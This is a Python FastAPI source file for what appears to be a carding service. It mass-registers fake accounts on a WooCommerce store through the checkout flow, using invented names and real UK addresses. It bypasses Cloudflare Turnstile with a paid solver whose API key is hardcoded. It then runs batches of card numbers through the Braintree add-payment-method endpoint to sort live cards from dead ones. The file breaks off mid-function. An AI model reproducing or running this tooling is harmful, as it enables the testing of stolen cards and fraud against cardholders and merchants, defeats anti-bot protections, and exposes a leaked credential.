
import time, json, uuid, re, base64, random, os, threading, sys
from datetime import datetime
from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
import requests as plain_requests
import uvicorn
from faker import Faker
from concurrent.futures import ThreadPoolExecutor, as_completed

app = FastAPI()

# ─── Config (env vars for Railway) ───────────────────────────

GATEWAY_NAME = "Braintree Auth"
CREDIT = "@xoxhunterxd"
BASE_URL = (os.environ.get("BASE_URL") or os.environ.get("URL") or "").rstrip("/")
COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookies_pool.json")
STATS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookies_stats.json")

# ─── Pool floor / ceiling ────────────────────────────────────
# never auto-grow past MAX, never let the pool sit under MIN
MAX_ACCOUNTS = int(os.environ.get("MAX_ACCOUNTS", "600"))
MIN_ACCOUNTS = int(os.environ.get("MIN_ACCOUNTS", "20"))
# how long card checks stay pending while the auto-refill grinds back to MIN
POOL_WAIT_SECONDS = int(os.environ.get("POOL_WAIT_SECONDS", "120"))

# ─── UK Real Addresses ────────────────────────────────────────

UK_ADDRESSES = [
    {"a1": "221B Baker Street", "a2": "", "city": "London", "state": "LONDON", "zip": "NW1 6XE", "phone": "020 7224 3688"},
    {"a1": "10 Downing Street", "a2": "", "city": "London", "state": "LONDON", "zip": "SW1A 2AA", "phone": "020 7925 0918"},
    {"a1": "1 Kensington Gore", "a2": "Flat 4", "city": "London", "state": "LONDON", "zip": "SW7 2AR", "phone": "020 7589 5320"},
    {"a1": "44 Portland Place", "a2": "", "city": "London", "state": "LONDON", "zip": "W1B 1NE", "phone": "020 7636 5732"},
    {"a1": "55 Regent Street", "a2": "Suite 12", "city": "London", "state": "LONDON", "zip": "W1B 4EE", "phone": "020 7434 8900"},
    {"a1": "1 King's Parade", "a2": "", "city": "Cambridge", "state": "CAMBRIDGESHIRE", "zip": "CB2 1SJ", "phone": "01223 330068"},
    {"a1": "90 Oxford Street", "a2": "", "city": "Manchester", "state": "GREATER MANCHESTER", "zip": "M1 5EP", "phone": "0161 236 7100"},
    {"a1": "12 Park Lane", "a2": "Flat 2", "city": "London", "state": "LONDON", "zip": "W1K 1AZ", "phone": "020 7495 7300"},
    {"a1": "3 Bridge Street", "a2": "", "city": "Edinburgh", "state": "CITY OF EDINBURGH", "zip": "EH1 1LT", "phone": "0131 225 6231"},
    {"a1": "25 Victoria Street", "a2": "", "city": "Birmingham", "state": "WEST MIDLANDS", "zip": "B1 3NT", "phone": "0121 200 3500"},
]

# ─── Cookie Pool + Round-Robin ───────────────────────────────

_cookie_index = 0
_cookie_lock = threading.Lock()
_building_count = 0
_acc_requested = 0
_acc_done = 0
_acc_failed = 0
_building_lock = threading.Lock()
_stop_creating_event = threading.Event()

def load_pool():
    if os.path.exists(COOKIE_FILE):
        try:
            with open(COOKIE_FILE, "r") as f:
                return json.load(f)
        except:
            return []
    return []

def save_pool(pool):
    try:
        with open(COOKIE_FILE, "w") as f:
            json.dump(pool, f, indent=2)
    except:
        pass

# ─── Lifetime stats (survive restarts) ───────────────────────
_stats_lock = threading.Lock()

def load_stats():
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                return json.load(f)
        except:
            pass
    return {"created_total": 0, "expired_total": 0, "failed_total": 0}

def save_stats(st):
    try:
        with open(STATS_FILE, "w") as f:
            json.dump(st, f, indent=2)
    except:
        pass

def bump_stat(key, by=1):
    with _stats_lock:
        st = load_stats()
        st[key] = st.get(key, 0) + by
        save_stats(st)

def bump_fail_reason(reason):
    """Track WHERE creation dies — register_page / captcha / no_login_cookie etc."""
    reason = (str(reason) or "unknown")[:60]
    with _stats_lock:
        st = load_stats()
        reasons = st.get("fail_reasons", {})
        reasons[reason] = reasons.get(reason, 0) + 1
        st["fail_reasons"] = reasons
        save_stats(st)

def stats_payload():
    """Full pool picture — one shape everywhere (/, /b3?acc=0, /stop)."""
    st = load_stats()
    pool = load_pool()
    with _building_lock:
        building = _building_count
        requested = _acc_requested
        done = _acc_done
        failed = _acc_failed
    return {
        "status": "ok",
        "total_accounts_created": st.get("created_total", 0),
        "working_accounts": len(pool),
        "total_cookies": len(pool),
        "building": building,
        "failed_during_building": failed,
        "expired": st.get("expired_total", 0),
        "failed_total": st.get("failed_total", 0),
        "fail_reasons": st.get("fail_reasons", {}),
        "session": {"requested": requested, "done": done, "failed": failed},
        "pool_min": MIN_ACCOUNTS,
        "pool_max": MAX_ACCOUNTS,
    }

def get_rotated_cookie_entry():
    global _cookie_index
    pool = load_pool()
    if not pool:
        return None
    with _cookie_lock:
        idx = _cookie_index % len(pool)
        _cookie_index += 1
    return pool[idx]

# ─── Sticky cookies — per-worker, all cards ride one session until it dies ──
# Each batch worker thread grabs its OWN distinct cookie (5 cards -> 5 cookies)
# and stays glued to it until the session expires; single checks do the same
# on their request thread.
_tls = threading.local()                 # per-thread sticky entry
_sticky_held = set()                     # emails currently held by workers
_sticky_held_lock = threading.Lock()

def acquire_sticky_cookie_entry():
    """Take a live cookie no other worker is holding. If every cookie is
    already held, share the first one rather than fail."""
    pool = load_pool()
    if not pool:
        return None
    with _sticky_held_lock:
        live = {e.get("email") for e in pool}
        _sticky_held.intersection_update(live)   # drop holds on dead cookies
        for e in pool:
            if e.get("email") not in _sticky_held:
                _sticky_held.add(e.get("email"))
                return e
        return pool[0]

def release_sticky_cookie(entry):
    """Give up the hold (cookie died or thread moving on)."""
    if not entry:
        return
    with _sticky_held_lock:
        _sticky_held.discard(entry.get("email"))
    if getattr(_tls, "sticky", None) and \
            _tls.sticky.get("email") == entry.get("email"):
        _tls.sticky = None

def get_worker_sticky_cookie():
    """Same cookie for this thread every time until it's gone from the pool,
    then grab the next free one."""
    ent = getattr(_tls, "sticky", None)
    if ent is not None:
        pool = load_pool()
        if any(e.get("email") == ent.get("email") for e in pool):
            return ent
        # died — drop the hold, fall through to a fresh pick
        release_sticky_cookie(ent)
        _tls.sticky = None
    ent = acquire_sticky_cookie_entry()
    _tls.sticky = ent
    return ent

def remove_cookie_entry(email):
    with _cookie_lock:
        pool = load_pool()
        new_pool = [entry for entry in pool if entry.get("email") != email]
        removed = len(pool) - len(new_pool)
        save_pool(new_pool)
    if removed > 0:
        bump_stat("expired_total", removed)       # lifetime expired/dead count
        # a cookie just died — replace it 1:1 (floor refill handles mass deaths)
        try:
            replace_dead_cookie()
        except Exception:
            pass

def check_cookie_alive(cookies_dict):
    try:
        s = plain_requests.Session()
        s.headers.update({'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        for k, v in cookies_dict.items():
            s.cookies.set(k, v)
        r = s.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=15, allow_redirects=False)
        return r.status_code == 200
    except:
        return False

def mark_billing_done(email):
    """Flip a pool entry's billing flag to True (lazy, once per cookie)."""
    with _cookie_lock:
        pool = load_pool()
        for entry in pool:
            if entry.get("email") == email:
                entry["billing"] = True
                break
        save_pool(pool)

# ─── Helpers ─────────────────────────────────────────────────

def get_card_brand(cc):
    cc = str(cc).strip()
    if re.match(r'^4', cc): return "Visa"
    elif re.match(r'^(5[1-5]|2[2-7])', cc): return "MasterCard"
    elif re.match(r'^(34|37)', cc): return "American Express"
    elif re.match(r'^(6011|65|64[4-9]|622)', cc): return "Discover"
    elif re.match(r'^(352[89]|35[3-8][0-9])', cc): return "JCB"
    elif re.match(r'^(30[0-5]|36|38)', cc): return "Diners Club"
    return "Unknown"

def luhn_check(cn):
    digits = [int(d) for d in str(cn) if d.isdigit()]
    if not digits: return False
    digits.reverse()
    total = sum(digits[0::2]) + sum(d - 9 if d > 9 else d for d in [x * 2 for x in digits[1::2]])
    return total % 10 == 0

def is_expired(mm, yy):
    try:
        month, year = int(mm), int(yy)
        if year < 100: year += 2000
        now = datetime.now()
        return year < now.year or (year == now.year and month < now.month)
    except:
        return True

def sanitize(msg):
    if not msg: return ""
    msg = str(msg)
    msg = re.sub(r"https?://[^:\s]+:[^@\s]+@[^\s'\")\]]+", "", msg)
    msg = re.sub(r"([a-zA-Z0-9._-]+:[0-9]+:[a-zA-Z0-9._-]+:[a-zA-Z0-9._-]+)", "", msg)
    msg = re.sub(r"HTTPSConnectionPool\([^)]+\):\s*", "", msg)
    msg = re.sub(r"HTTPConnectionPool\([^)]+\):\s*", "", msg)
    msg = re.sub(r"https?://[^\s'\")\]]+", "", msg)
    msg = re.sub(r"celergenus[^\s'\")\]]*", "", msg, flags=re.IGNORECASE)
    msg = re.sub(r"valyrian[^\s'\")\]]*", "", msg, flags=re.IGNORECASE)
    msg = re.sub(r"turnstile-solver[^\s'\")\]]*", "", msg, flags=re.IGNORECASE)
    msg = re.sub(r"[a-zA-Z0-9._-]+\.valyrian\.cc", "", msg, flags=re.IGNORECASE)
    if 'BASE_URL' in globals() and BASE_URL:
        site_host = BASE_URL.replace("https://", "").replace("http://", "").split("/")[0]
        if site_host:
            msg = re.sub(re.escape(site_host), "", msg, flags=re.IGNORECASE)
    if 'AI_SOLVER_URL' in globals() and AI_SOLVER_URL:
        solver_host = AI_SOLVER_URL.replace("https://", "").replace("http://", "").split("/")[0]
        if solver_host:
            msg = re.sub(re.escape(solver_host), "", msg, flags=re.IGNORECASE)
    msg = re.sub(r"[a-zA-Z0-9._-]+\.braintreegateway\.com", "", msg)
    msg = re.sub(r"proxy\.pinguproxy\.com(:\d+)?", "", msg, flags=re.IGNORECASE)
    msg = re.sub(r"\[PROXY\]", "", msg)
    msg = re.sub(r"ProxyError\([^)]+\)", "Proxy Connection Error", msg)
    msg = re.sub(r"NewConnectionError\([^)]+\)", "", msg)
    msg = re.sub(r"Max retries exceeded with url:.*", "Connection Timeout", msg)
    msg = re.sub(r"\s+", " ", msg)
    return msg.strip()

# ─── Cloudflare Turnstile Solver (CaptchaAI) ──────────────────

CAPTCHA_AI_KEY = os.environ.get("CAPTCHA_AI_KEY", "j87puttfpmta1fynqy0iwqjlco34z4yr")

def solve_turnstile(page_url=None, sitekey="0x4AAAAAAA9ogJWz4UGndXNX", max_retry=3, poll_retry=36):
    if not page_url:
        page_url = f"{BASE_URL}/my-account/"
    in_url = "https://ocr.captchaai.com/in.php"
    res_url = "https://ocr.captchaai.com/res.php"
    for _ in range(max_retry):
        try:
            r = plain_requests.get(in_url, params={
                "key": CAPTCHA_AI_KEY,
                "method": "turnstile",
                "sitekey": sitekey,
                "pageurl": page_url,
                "json": 1,
            }, timeout=30)
            d = r.json()
            if d.get("status") != 1:
                continue
            for _ in range(poll_retry):
                time.sleep(5)
                rr = plain_requests.get(res_url, params={
                    "key": CAPTCHA_AI_KEY,
                    "action": "get",
                    "id": d["request"],
                    "json": 1,
                }, timeout=15)
                rd = rr.json()
                if rd.get("status") == 1:
                    return rd["request"]
                if "CAPCHA_NOT_READY" not in str(rd.get("request", "")):
                    break
        except Exception:
            pass
    return None

# ─── Account Creator ─────────────────────────────────────────

def create_account(proxy=None):
    """Checkout-based creation — the site closed my-account registration, but
    WooCommerce still creates the account during checkout (createaccount=1)
    BEFORE payment processing, so the card decline doesn't matter: we keep
    the account + logged-in cookies."""
    from bs4 import BeautifulSoup
    import base64
    import uuid
    import json
    if not BASE_URL:
        return {"email": "", "status": "failed", "reason": "config_missing_base_url"}
    s = plain_requests.Session()
    s.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
    })
    fake_us = Faker('en_US')
    first, last = fake_us.first_name(), fake_us.last_name()
    email = f"{first.lower()}{last.lower()}{random.randint(1975, 2005)}@gmail.com"
    pwd = f"{first.capitalize()}@{random.randint(1000, 9999)}!"
    try:
        # 1. Shop page -> find a product
        if _stop_creating_event.is_set():
            return {"email": email, "status": "failed", "reason": "stopped"}
        r = s.get(f"{BASE_URL}/shop/", timeout=20)
        if r.status_code != 200:
            return {"email": email, "status": "failed", "reason": "shop_page_failed"}
        pids = re.findall(r'data-product_id="(\d+)"', r.text)
        if not pids: pids = re.findall(r'add-to-cart=(\d+)', r.text)
        if not pids:
            return {"email": email, "status": "failed", "reason": "no_product_found"}
        pid = random.choice(pids)

        # 2. Add to cart
        s.get(f"{BASE_URL}/?add-to-cart={pid}", timeout=20)

        # 3. Checkout page -> nonce + turnstile
        if _stop_creating_event.is_set():
            return {"email": email, "status": "failed", "reason": "stopped"}
        r = s.get(f"{BASE_URL}/checkout/", timeout=20)
        if r.status_code != 200:
            return {"email": email, "status": "failed", "reason": "checkout_page_failed"}
        soup = BeautifulSoup(r.text, 'html.parser')
        cn = soup.find("input", {"name": "woocommerce-process-checkout-nonce"})
        if not cn:
            return {"email": email, "status": "failed", "reason": "no_checkout_nonce"}
        cn_val = cn.get("value")
        cm = re.search(r'"client_token_nonce":"([a-f0-9]+)"', r.text)
        if not cm:
            return {"email": email, "status": "failed", "reason": "no_client_token_nonce"}
        ctn = cm.group(1)

        # 4. Solve turnstile (CaptchaAI)
        if _stop_creating_event.is_set():
            return {"email": email, "status": "failed", "reason": "stopped"}
        gt = solve_turnstile(f"{BASE_URL}/checkout/")
        if not gt:
            return {"email": email, "status": "failed", "reason": "captcha"}

        # 5. Braintree client token + tokenize throwaway card (decline is fine —
        #    the account is already created by the time payment is processed)
        rb = s.post(f"{BASE_URL}/wp-admin/admin-ajax.php",
                    data={"action": "wc_braintree_credit_card_get_client_token", "nonce": ctn},
                    headers={'x-requested-with': 'XMLHttpRequest'}, timeout=20)
        bd = rb.json()
        dec = json.loads(base64.b64decode(bd["data"]).decode('utf-8'))
        rt = plain_requests.post(f"{dec['clientApiUrl']}/v1/payment_methods/credit_cards", json={
            "creditCard": {"number": "4111111111111111", "expirationMonth": "12",
                           "expirationYear": "2026", "cvv": "123"},
            "authorizationFingerprint": dec['authorizationFingerprint'],
            "braintreeLibraryVersion": "braintree/web/3.88.0",
            "_meta": {"platform": "web", "sdkVersion": "3.88.0", "source": "form",
                      "integration": "custom", "sessionId": uuid.uuid4().hex}
        }, timeout=30)
        try:
            cn_card = rt.json()['creditCards'][0]['nonce']
        except Exception:
            return {"email": email, "status": "failed",
                    "reason": f"tokenize: {sanitize(rt.text[:80])}"}

        # 6. Checkout with account creation — account + login land before payment
        if _stop_creating_event.is_set():
            return {"email": email, "status": "failed", "reason": "stopped"}
        addr = random.choice(UK_ADDRESSES)
        checkout_data = {
            "ship_to_different_address": "1",
            "shipping_first_name": first, "shipping_last_name": last,
            "shipping_country": "GB",
            "shipping_address_1": addr["a1"], "shipping_address_2": addr["a2"],
            "shipping_city": addr["city"], "shipping_state": addr["state"],
            "shipping_postcode": addr["zip"], "shipping_phone": addr["phone"],
            "billing_first_name": first, "billing_last_name": last,
            "billing_country": "GB",
            "billing_address_1": addr["a1"], "billing_address_2": addr["a2"],
            "billing_city": addr["city"], "billing_state": addr["state"],
            "billing_postcode": addr["zip"], "billing_phone": addr["phone"],
            "billing_email": email, "shipping_email": email,
            "use_shipping_address": "1",
            "createaccount": "1",
            "account_username": email,
            "account_password": pwd,
            "payment_method": "braintree_credit_card",
            "wc-braintree-credit-card-card-type": "visa",
            "wc-braintree-credit-card-3d-secure-order-total": "100.00",
            "wc_braintree_credit_card_payment_nonce": cn_card,
            "wc-braintree-credit-card-tokenize-payment-method": "true",
            "woocommerce-process-checkout-nonce": cn_val,
            "_wp_http_referer": "/?wc-ajax=update_order_review",
            "cf-turnstile-response": gt,
            "terms": "on",
            "terms-field": "1",
        }
        r = s.post(f"{BASE_URL}/?wc-ajax=checkout", data=checkout_data,
                   timeout=25, allow_redirects=True)
        cd = s.cookies.get_dict()
        if not any("wordpress_logged_in" in k for k in cd):
            try:
                rj = r.json()
                reason_text = BeautifulSoup(rj.get("messages", ""), 'html.parser').get_text().strip()
                if not reason_text: reason_text = "no_login_cookie"
                return {"email": email, "status": "failed", "reason": reason_text[:80]}
            except Exception:
                return {"email": email, "status": "failed", "reason": "no_login_cookie_and_no_json"}

        # 7. Save to pool — billing already set during checkout, so skip lazy billing
        new_entry = {"email": email, "password": pwd, "cookies": cd,
                     "billing": True, "created_at": time.strftime("%Y-%m-%d %H:%M:%S")}
        pool = load_pool()
        pool.append(new_entry)
        if len(pool) > MAX_ACCOUNTS: pool = pool[-MAX_ACCOUNTS:]   # ceiling, not 500
        save_pool(pool)
        bump_stat("created_total")                                  # lifetime count
        # fire billing in the background so the first card check on this cookie
        # is already fast — no latency penalty on /b3 or /batch
        _billing_executor.submit(add_billing_bg, new_entry)
        return {"email": email, "status": "success"}
    except Exception as e:
        return {"email": email, "status": "failed", "reason": str(e)[:80]}

def create_accounts_bg(count, proxy=None):
    global _building_count, _acc_requested, _acc_done, _acc_failed
    _stop_creating_event.clear()
    with _building_lock:
        _building_count += count
        _acc_requested += count

    def worker():
        global _building_count, _acc_done, _acc_failed
        if _stop_creating_event.is_set():
            with _building_lock:
                _building_count -= 1               # release the slot on cancel
            return False
        result = create_account(proxy=proxy)
        ok = bool(result and result.get("status") == "success")
        stopped = bool(result and result.get("reason") == "stopped")
        with _building_lock:
            _building_count -= 1
            if ok:
                _acc_done += 1
            elif not stopped:
                _acc_failed += 1                   # cancelled ≠ failed
        if not ok and not stopped:
            bump_stat("failed_total")              # lifetime build failures
            bump_fail_reason((result or {}).get("reason", "unknown"))
        return True

    # 5 accounts in parallel — submissions staggered slightly so we don't
    # hit Cloudflare from five threads at the exact same millisecond
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for i in range(count):
            if _stop_creating_event.is_set():
                remaining = count - i
                with _building_lock:
                    _building_count -= remaining
                    _acc_failed += remaining
                break
            futures.append(executor.submit(worker))
            time.sleep(random.uniform(0.5, 1.5))

        for _ in as_completed(futures):
            pass

# ─── Auto-refill: MIN floor / MAX ceiling / 1:1 death replacement ──

_refill_lock = threading.Lock()

def replace_dead_cookie():
    """A cookie died → replace it exactly 1:1 (2 dead = 2 new), capped at
    MAX_ACCOUNTS. Under the MIN floor the refill-to-MIN covers the loss."""
    with _refill_lock:
        pool = load_pool()
        with _building_lock:
            building = _building_count
        total = len(pool) + building
        if total >= MAX_ACCOUNTS:
            return
        if len(pool) < MIN_ACCOUNTS:
            need = min(MIN_ACCOUNTS - total, MAX_ACCOUNTS - total)
        else:
            need = 1                        # straight 1:1 swap
        if need <= 0:
            return
        threading.Thread(target=create_accounts_bg, args=(need,), daemon=True).start()

def maybe_auto_refill():
    """Pool under MIN_ACCOUNTS → fire creation (5-parallel) back up to MIN.
    Never grows the pool past MAX_ACCOUNTS. Safe to call from anywhere."""
    pool = load_pool()
    with _building_lock:
        building = _building_count
    total = len(pool) + building
    if len(pool) >= MIN_ACCOUNTS or total >= MAX_ACCOUNTS:
        return
    with _refill_lock:
        # re-check under the lock so concurrent deaths only fire one refill
        pool = load_pool()
        with _building_lock:
            building = _building_count
        total = len(pool) + building
        if len(pool) >= MIN_ACCOUNTS or total >= MAX_ACCOUNTS:
            return
        need = min(MIN_ACCOUNTS - total, MAX_ACCOUNTS - total)
        if need <= 0:
            return
        threading.Thread(target=create_accounts_bg, args=(need,), daemon=True).start()

def wait_for_min_pool(timeout=POOL_WAIT_SECONDS):
    """Called before a card check when the pool is thin: stay pending while
    the auto-refill grinds back to MIN. Gives up waiting (but proceeds with
    whatever exists) once cards are checkable or the timeout hits.
    Returns True if there's at least one usable cookie."""
    t0 = time.time()
    while time.time() - t0 < timeout:
        pool = load_pool()
        if len(pool) >= MIN_ACCOUNTS:
            return True
        maybe_auto_refill()
        if pool:
            # under MIN but we have working cookies — checks proceed;
            # the refill keeps grinding in the background
            return True
        time.sleep(2)
    return bool(load_pool())

def _pool_watchdog():
    """Safety net: every 30s check the floor, even if a death path missed
    its refill hook (billing worker, manual pool edit, crash)."""
    while True:
        try:
            maybe_auto_refill()
        except Exception:
            pass
        time.sleep(30)

# ─── Lazy Billing (once per cookie, at check time) ──────────

def ensure_billing(session, entry):
    """Add the billing address to this cookie's account the first time it's
    used. Subsequent checks with the same cookie skip this entirely — the
    billing flag in the pool gates it. Idempotent and safe to re-run."""
    if entry.get("billing"):
        return True  # already done for this cookie — skip
    from bs4 import BeautifulSoup
    addr = random.choice(UK_ADDRESSES)
    email = entry.get("email", "")
    try:
        r = session.get(f"{BASE_URL}/my-account/edit-address/billing/", timeout=20)
        if r.status_code != 200:
            return False
        soup = BeautifulSoup(r.text, 'html.parser')
        an = soup.find("input", {"name": "woocommerce-edit-address-nonce"})
        if not an:
            return False
        session.post(f"{BASE_URL}/my-account/edit-address/billing/", data={
            "billing_first_name": email.split("@")[0].split(".")[0].capitalize() or "John",
            "billing_last_name":  (email.split("@")[0].split(".")[-1] if "." in email.split("@")[0] else "Smith").capitalize(),
            "billing_company": "",
            "billing_country": "GB",
            "billing_address_1": addr["a1"],
            "billing_address_2": addr["a2"],
            "billing_city": addr["city"],
            "billing_state": addr["state"],
            "billing_postcode": addr["zip"],
            "billing_phone": addr["phone"],
            "billing_email": email,
            "save_address": "Save address",
            "woocommerce-edit-address-nonce": an.get("value"),
            "_wp_http_referer": "/my-account/edit-address/billing/",
            "action": "edit_address"
        }, headers={'content-type': 'application/x-www-form-urlencoded', 'origin': BASE_URL,
                    'referer': f"{BASE_URL}/my-account/edit-address/billing/"}, timeout=25, allow_redirects=True)
        # mark done so we never repeat it for this cookie
        mark_billing_done(email)
        return True
    except Exception:
        return False

# ─── Background Billing (fires the instant an account is created) ──

# dedicated worker pool so billing never blocks card checks or account creation
_billing_executor = ThreadPoolExecutor(max_workers=6, thread_name_prefix="billing")

def add_billing_bg(entry):
    """Run ensure_billing for a freshly-created account, in the background.
    Uses its own session so it doesn't interfere with the creator's session.
    Called the moment create_account() returns success — by the time a card
    check picks up this cookie, billing is almost always already done."""
    if entry.get("billing"):
        return  # already done
    s = plain_requests.Session()
    s.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
    })
    for k, v in entry.get("cookies", {}).items():
        s.cookies.set(k, v)
    ensure_billing(s, entry)

# ─── Card Checker ────────────────────────────────────────────

def check_card(cc, mm, yy, cvv, proxy=None):
    t0 = time.time()
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    brand = get_card_brand(cc)

    def result(msg):
        return {"card": card_str, "gateway": GATEWAY_NAME, "response": sanitize(msg), "time": f"{time.time()-t0:.1f}s", "credit": CREDIT}

    if not luhn_check(cc): return result("Card is Incorrect")
    if is_expired(mm, yy): return result("Expired Card")
    cvv_c = str(cvv).strip()
    if brand == "American Express" and len(cvv_c) != 4: return result("Invalid CVV (4 digits for Amex)")
    elif brand != "American Express" and len(cvv_c) != 3: return result("Invalid CVV (3 digits required)")

    pool = load_pool()
    if not pool:
        # pool empty — pending while auto-refill grinds toward MIN_ACCOUNTS
        if not wait_for_min_pool():
            return result("No cookies! Auto-refill running — retry shortly")

    if not BASE_URL:
        return result("Config error: BASE_URL env not set")

    s = plain_requests.Session()
    s.headers.update({
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    })

    # Load THIS WORKER's sticky cookie — same session until it dies
    saved_entry = get_worker_sticky_cookie()
    if saved_entry:
        for k, v in saved_entry.get("cookies", {}).items():
            s.cookies.set(k, v)
        # lazy billing — once per cookie, before we touch add-payment-method
        ensure_billing(s, saved_entry)

    # 1. GET add-payment-method & retry if cookie is expired/invalid
    try:
        r = s.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=20)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(r.text, 'html.parser')
        ae = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})

        if r.status_code != 200 or 'add-payment-method' not in r.url or not ae:
            if saved_entry and saved_entry.get("email"):
                remove_cookie_entry(saved_entry["email"])   # 1:1 replacement fires
            release_sticky_cookie(saved_entry)   # dead — this worker takes another

            for _ in range(min(len(load_pool()), 10)):
                alt_entry = get_worker_sticky_cookie()
                if not alt_entry: break
                s.cookies.clear()
                for k, v in alt_entry.get("cookies", {}).items(): s.cookies.set(k, v)
                # lazy billing for the fallback cookie too
                ensure_billing(s, alt_entry)
                r = s.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=20)
                soup = BeautifulSoup(r.text, 'html.parser')
                ae = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})
                if r.status_code == 200 and 'add-payment-method' in r.url and ae:
                    break
                else:
                    if alt_entry.get("email"):
                        remove_cookie_entry(alt_entry["email"])
                    release_sticky_cookie(alt_entry)
            else:
                return result("Session expired or invalid cookie. Hit /b3?acc=4")
    except Exception as e:
        return result(f"Page error: {sanitize(e)}")

    # 2. Parse nonces
    try:
        if not ae: return result("No nonce")
        an = ae.get("value")
        cm = re.search(r'"client_token_nonce":"([a-f0-9]+)"', r.text)
        if not cm: return result("No client_token_nonce")
        ctn = cm.group(1)
    except Exception as e:
        return result(f"Parse error: {sanitize(e)}")

    # 3. Get Braintree client token
    try:
        rb = s.post(f"{BASE_URL}/wp-admin/admin-ajax.php",
                    data={"action": "wc_braintree_credit_card_get_client_token", "nonce": ctn},
                    headers={'accept': 'application/json, text/javascript, */*; q=0.01',
                             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                             'origin': BASE_URL, 'referer': f"{BASE_URL}/my-account/add-payment-method/",
                             'x-requested-with': 'XMLHttpRequest'}, timeout=20)
        bd = rb.json()
        if not bd.get("data"): return result("No Braintree token")
        dec = json.loads(base64.b64decode(bd["data"]).decode('utf-8'))
    except Exception as e:
        return result(f"Token error: {sanitize(e)}")

    # 4. Tokenize card
    try:
        ey = ("20" + yy) if len(yy) == 2 else yy
        rt = plain_requests.post(f"{dec['clientApiUrl']}/v1/payment_methods/credit_cards", json={
            "creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": ey, "cvv": cvv_c},
            "authorizationFingerprint": dec['authorizationFingerprint'],
            "braintreeLibraryVersion": "braintree/web/3.88.0",
            "_meta": {"platform": "web", "sdkVersion": "3.88.0", "source": "form", "integration": "custom", "sessionId": uuid.uuid4().hex}
        }, timeout=30)
        if rt.status_code != 201:
            try:
                er = rt.json()
                m = er.get("error", {}).get("message", "")
                if not m:
                    fl = []
                    for fe in er.get("fieldErrors", []):
                        for sub in fe.get("fieldErrors", []): fl.append(sub.get("message", ""))
                    m = "; ".join(fl) if fl else rt.text[:100]
            except:
                m = rt.text[:100]
            return result(f"Tokenization: {sanitize(m)}")
        cn = rt.json()['creditCards'][0]['nonce']
        ct = rt.json()['creditCards'][0].get('type', brand.lower())
        dd = json.dumps({"device_session_id": uuid.uuid4().hex, "fraud_merchant_id": "600000", "correlation_id": uuid.uuid4().hex})
    except Exception as e:
        return result(f"Tokenize error: {sanitize(e)}")

    # 5. Submit add-payment-method
    try:
        rs = s.post(f"{BASE_URL}/my-account/add-payment-method/", data={
            "payment_method": "braintree_credit_card",
            "wc-braintree-credit-card-card-type": ct,
            "wc-braintree-credit-card-3d-secure-enabled": "",
            "wc-braintree-credit-card-3d-secure-verified": "",
            "wc-braintree-credit-card-3d-secure-order-total": "150.00",
            "wc_braintree_credit_card_payment_nonce": cn,
            "wc_braintree_device_data": dd,
            "wc-braintree-credit-card-tokenize-payment-method": "true",
            "woocommerce-add-payment-method-nonce": an,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "woocommerce_add_payment_method": "1",
        }, headers={'content-type': 'application/x-www-form-urlencoded', 'origin': BASE_URL,
                    'referer': f"{BASE_URL}/my-account/add-payment-method/"}, timeout=30, allow_redirects=True)
    except Exception as e:
        return result(f"Submit error: {sanitize(e)}")

    # 6. Parse response
    try:
        from bs4 import BeautifulSoup
        s2 = BeautifulSoup(rs.text, 'html.parser')
        if 'payment-methods' in rs.url and 'add' not in rs.url:
            return result("APPROVED - Payment Method Added")
        se = s2.find(class_='woocommerce-message')
        if se and se.get_text().strip():
            return result(f"APPROVED - {se.get_text().strip()}")
        ee = s2.find(class_='woocommerce-error')
        if ee:
            raw = re.sub(r'\s+', ' ', ee.get_text().strip())
            mx = re.search(r'Status code (\d+):\s*(.+)', raw)
            if mx: return result(f"Declined [{mx.group(1)}]: {mx.group(2).strip()}")
            if "gateway reject" in raw.lower():
                if "cvv" in raw.lower(): return result("Card Issuer Declined CVV")
                elif "fraud" in raw.lower(): return result("Declined - Fraud Detection")
                elif "avs" in raw.lower(): return result("Declined - AVS Mismatch")
                return result(f"Gateway Rejected: {sanitize(raw)}")
            if "insufficient" in raw.lower(): return result("Insufficient Funds")
            return result(sanitize(raw))
        return result("Card Declined")
    except Exception as e:
        return result(f"Parse error: {sanitize(e)}")

# ─── Card List Parser ────────────────────────────────────────

def parse_card_list(raw):
    if not raw: return []
    cards = []
    for m in re.finditer(r'((?:34|37)\d{13}[|:]\d{1,2}[|:]\d{2,4}[|:]\d{4})|(\d{13,19}[|:]\d{1,2}[|:]\d{2,4}[|:]\d{3})', raw):
        c = m.group(1) or m.group(2)
        if c and c not in cards:
            cards.append(c)
            if len(cards) >= 30: break
    if cards: return cards
    for p in re.split(r'[\s,\n\r]+', raw):
        sp = re.split(r'[|:]', p.strip())
        if len(sp) >= 4 and all(x.isdigit() for x in sp[:4]):
